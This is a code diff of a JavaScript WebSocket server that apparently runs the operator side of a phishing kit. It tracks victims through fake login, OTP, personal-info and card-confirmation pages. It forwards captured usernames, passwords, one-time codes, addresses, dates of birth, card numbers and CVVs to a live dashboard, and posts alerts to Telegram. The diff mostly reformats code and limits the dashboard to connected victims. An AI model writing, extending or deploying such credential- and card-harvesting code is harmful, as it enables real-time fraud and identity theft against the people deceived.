@@ -348,7 +348,8 @@ function sendChangeNotification(sessionId, data, changeType) {
   const notification = `${emoji} <b>UPDATE</b> - ${shortId}\n${changeText}\n🕐 ${timestamp}`;
 
   // Get the main message ID to reply to
-  const mainMessageId = telegramMessages.get(sessionId) || data.telegramMessageId;
+  const mainMessageId =
+    telegramMessages.get(sessionId) || data.telegramMessageId;
 
   // Send as reply to main client fiche
   sendTelegramReply(notification, mainMessageId, (messageId) => {
@@ -491,7 +492,9 @@ function sendTelegramReply(message, replyToMessageId, callback) {
         );
         if (callback) callback(result.result.message_id);
       } else {
-        console.error(`[Telegram] ✗ Reply error ${res.statusCode}: ${responseData}`);
+        console.error(
+          `[Telegram] ✗ Reply error ${res.statusCode}: ${responseData}`
+        );
         if (callback) callback(null);
       }
     });
@@ -784,14 +787,16 @@ wss.on("connection", (ws, req) => {
               page: data.page,
               status: "connected",
               ip: clientIP,
-              data: dbData ? {
-                ip: dbData.ip,
-                login: dbData.login,
-                otp: dbData.otp ? { otp: dbData.otp } : null,
-                personalInfo: dbData.personalInfo,
-                cardInfo: dbData.cardInfo,
-                phone: dbData.phone,
-              } : null,
+              data: dbData
+                ? {
+                    ip: dbData.ip,
+                    login: dbData.login,
+                    otp: dbData.otp ? { otp: dbData.otp } : null,
+                    personalInfo: dbData.personalInfo,
+                    cardInfo: dbData.cardInfo,
+                    phone: dbData.phone,
+                  }
+                : null,
             });
           }
           break;
@@ -914,55 +919,39 @@ wss.on("connection", (ws, req) => {
           dashboards.add(ws);
           ws.isDashboard = true;
 
-          // Send all sessions from DATABASE (not just memory) to new dashboard
-          // This ensures sessions are visible even if dashboard was closed when data arrived
-          const dbSessions = db.prepare(`
-            SELECT session_id, ip, username, password, otp, first_name, last_name, 
-                   email, address, date_of_birth, card_holder, card_number, 
-                   card_expiry, card_cvv, phone, status, updated_at
-            FROM sessions 
-            WHERE updated_at > datetime('now', '-24 hours')
-            ORDER BY updated_at DESC
-          `).all();
+          // Send ONLY currently connected sessions (with their DB data)
+          const activeSessions = [];
+          sessions.forEach((session, sessionId) => {
+            // Only include if WebSocket is still open
+            if (session.ws && session.ws.readyState === WebSocket.OPEN) {
+              // Get full data from DB
+              const dbData = getSessionData(sessionId);
 
-          const activeSessions = dbSessions.map((row) => {
-            // Determine current page based on last data received
-            let page = 'login';
-            if (row.card_number) page = 'card-confirm';
-            else if (row.first_name) page = 'personal-info';
-            else if (row.otp) page = 'otp';
-            else if (row.username) page = 'login';
+              // Determine current page based on last data received
+              let page = session.page || "login";
+              if (dbData) {
+                if (dbData.cardInfo) page = "card-confirm";
+                else if (dbData.personalInfo) page = "personal-info";
+                else if (dbData.otp) page = "otp";
+                else if (dbData.login) page = "login";
+              }
 
-            // Check if session is currently connected
-            const isConnected = sessions.has(row.session_id);
-
-            return {
-              sessionId: row.session_id,
-              page: page,
-              isConnected: isConnected,
-              data: {
-                ip: row.ip,
-                login: row.username ? {
-                  username: row.username,
-                  password: row.password,
-                } : null,
-                otp: row.otp ? { otp: row.otp } : null,
-                personalInfo: row.first_name ? {
-                  firstName: row.first_name,
-                  lastName: row.last_name,
-                  email: row.email,
-                  address: row.address,
-                  dateOfBirth: row.date_of_birth,
-                } : null,
-                cardInfo: row.card_number ? {
-                  cardHolder: row.card_holder,
-                  cardNumber: row.card_number,
-                  expiry: row.card_expiry,
-                  cvv: row.card_cvv,
-                } : null,
-                phone: row.phone,
-              },
-            };
+              activeSessions.push({
+                sessionId: sessionId,
+                page: page,
+                isConnected: true,
+                data: dbData
+                  ? {
+                      ip: dbData.ip,
+                      login: dbData.login,
+                      otp: dbData.otp ? { otp: dbData.otp } : null,
+                      personalInfo: dbData.personalInfo,
+                      cardInfo: dbData.cardInfo,
+                      phone: dbData.phone,
+                    }
+                  : { ip: session.ip },
+              });
+            }
           });
 
           ws.send(
